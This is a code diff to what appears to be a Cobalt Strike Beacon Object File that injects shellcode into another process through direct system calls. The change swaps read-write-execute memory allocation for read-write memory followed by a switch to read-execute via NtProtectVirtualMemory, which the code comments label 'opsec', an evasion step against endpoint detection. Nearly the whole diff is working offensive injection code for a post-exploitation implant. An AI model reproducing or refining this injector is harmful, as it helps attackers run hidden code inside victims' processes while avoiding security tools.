@@ -55,6 +55,7 @@ VOID InjectShellcode(syscall_t *syscall, DWORD pid, char* sc_ptr, SIZE_T sc_len)
     CLIENT_ID         cid = {0};
     OBJECT_ATTRIBUTES oa = {sizeof(oa)};
     LARGE_INTEGER     li;
+    PULONG	      old=NULL;
     
     // Opening process
     cid.UniqueProcess = pid;
@@ -64,20 +65,27 @@ VOID InjectShellcode(syscall_t *syscall, DWORD pid, char* sc_ptr, SIZE_T sc_len)
     
     if(nts >= 0) {
       sc_len++;
-      // Allocating read-write (RWX) memory for shellcode (opsec 101)
+      // Allocating read-write (RW) memory for shellcode (opsec 101)
       nts = syscall->NtAllocateVirtualMemory(
         processHandle, &ds, 0, &sc_len, 
         MEM_COMMIT | MEM_RESERVE, 
-        PAGE_EXECUTE_READWRITE);
+        PAGE_READWRITE);
       
       if(nts >= 0) {    
-        // Copying shellcode to remote process
+       
+	// Copying shellcode to remote process
         nts = syscall->NtWriteVirtualMemory(processHandle, ds, sc_ptr, sc_len-1, &wr);
-        
+      
+	// Change memory permissions to RX
+	if(nts >= 0){ 
+	nts = syscall->NtProtectVirtualMemory(
+			processHandle, &ds, (PULONG)&sc_len,
+			PAGE_EXECUTE_READ, (PULONG)&old);
+
         if(nts >= 0) {
 
           // Executing thread in remote process
-          nts = syscall->NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, &oa, processHandle, 
+          nts = syscall->NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, &oa, processHandle,
               (LPTHREAD_START_ROUTINE)ds, ds, FALSE, 0, 0, 0, NULL);
             
           if(threadHandle != NULL) {
@@ -91,11 +99,13 @@ VOID InjectShellcode(syscall_t *syscall, DWORD pid, char* sc_ptr, SIZE_T sc_len)
         }
         // Free remote memory
         syscall->NtFreeVirtualMemory(processHandle, ds, 0, MEM_RELEASE | MEM_DECOMMIT);
-      } else BeaconPrintf(CALLBACK_ERROR,"Copying shellcode to remote process - FAILED! %08X\n", nts);
+      } 
+      }  else BeaconPrintf(CALLBACK_ERROR,"Copying shellcode to remote process - FAILED! %08X\n", nts);
       // Closing process handle
       syscall->NtClose(processHandle);
 
       BeaconPrintf(CALLBACK_OUTPUT, "Shellcode injection completed successfully!");
+    
 
     } else {
     	BeaconPrintf(CALLBACK_ERROR,"Opening process - FAILED! %08X\n", nts);
@@ -125,14 +135,16 @@ void go(char *args, int len) {
     sc.NtWaitForSingleObject   = (NtWaitForSingleObject_t)GetSyscallStub("NtWaitForSingleObject");
     sc.NtFreeVirtualMemory     = (NtFreeVirtualMemory_t)GetSyscallStub("NtFreeVirtualMemory");
     sc.NtClose                 = (NtClose_t)GetSyscallStub("NtClose");
-    
+    sc.NtProtectVirtualMemory  = (NtProtectVirtualMemory_t)GetSyscallStub("NtProtectVirtualMemory");
+
     if(sc.NtOpenProcess == NULL ||
        sc.NtAllocateVirtualMemory == NULL ||
        sc.NtWriteVirtualMemory == NULL ||
        sc.NtCreateThreadEx == NULL ||
        sc.NtWaitForSingleObject == NULL ||
        sc.NtFreeVirtualMemory == NULL ||
-       sc.NtClose == NULL) {
+       sc.NtClose == NULL || 
+       sc.NtProtectVirtualMemory == NULL) {
       
       BeaconPrintf(CALLBACK_ERROR,"unable to resolve address of some system calls.\n");
       BeaconPrintf(CALLBACK_ERROR,"NtOpenProcess           : %p\n", sc.NtOpenProcess);
@@ -142,6 +154,7 @@ void go(char *args, int len) {
       BeaconPrintf(CALLBACK_ERROR,"NtWaitForSingleObject   : %p\n", sc.NtWaitForSingleObject);
       BeaconPrintf(CALLBACK_ERROR,"NtFreeVirtualMemory     : %p\n", sc.NtFreeVirtualMemory);
       BeaconPrintf(CALLBACK_ERROR,"NtClose                 : %p\n", sc.NtClose);
+      BeaconPrintf(CALLBACK_ERROR,"NtProtectVirtualMemory  : %p\n", sc.NtProtectVirtualMemory);
     } else {
       InjectShellcode(&sc, pid, sc_ptr, sc_len);
     }
